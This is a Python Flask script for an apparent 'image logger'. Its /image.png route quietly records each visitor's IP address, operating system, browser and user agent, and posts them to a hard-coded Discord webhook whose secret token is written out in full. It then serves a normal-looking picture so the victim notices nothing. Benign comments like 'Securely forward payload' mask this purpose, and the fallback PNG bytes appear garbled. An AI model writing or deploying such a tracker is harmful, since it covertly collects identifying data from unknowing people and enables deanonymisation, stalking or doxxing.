from flask import Flask, request, send_file
import requests
import httpagentparser
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1557686272351408198/-dIayA_yXrES-RRzmD9Q300zAlumQZzXoSQ9mldTUooQkZSHkyf-mwqdAV_BCCno4nur"

@app.route('/image.png')
def serve_image():
    # 1. Capture Client Data safely through Vercel headers
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip and ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent', '')
    parsed_ua = httpagentparser.detect(user_agent)

    # 2. Structure payload information minimally
    payload = {
        "embeds": [{
            "fields": [
                {"name": "Network", "value": str(client_ip), "inline": True},
                {"name": "System", "value": str(parsed_ua.get('os', {}).get('name', 'Unknown')), "inline": True},
                {"name": "Client", "value": str(parsed_ua.get('browser', {}).get('name', 'Unknown')), "inline": True},
                {"name": "Raw", "value": str(user_agent), "inline": False}
            ]
        }]
    }

    # 3. Securely forward payload 
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=4)
    except Exception:
        pass 

        # 4. Fetch the external image URL and serve it
    IMAGE_URL = "https://cdn.phototourl.com/member/2026-10-08-b832828c-4011-4be7-86a7-136452849f41.png"  # <-- Put your actual image URL here
    
    try:
        img_response = requests.get(IMAGE_URL, timeout=5)
        return send_file(
            io.BytesIO(img_response.content), 
            mimetype=img_response.headers.get('Content-Type', 'image/png')
        )
    except Exception:
        # Fallback to a transparent pixel if the external URL fails to load
        pixel = b'\x89PNG\(\r\\)n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\rIDATx\x9cc`\x00\x01\x00\x00\x0c\x00\x01\x04g\xa0\x9e\x00\x00\x00\x00IEND\xaeB`\x82'
        return send_file(io.BytesIO(pixel), mimetype='image/png')


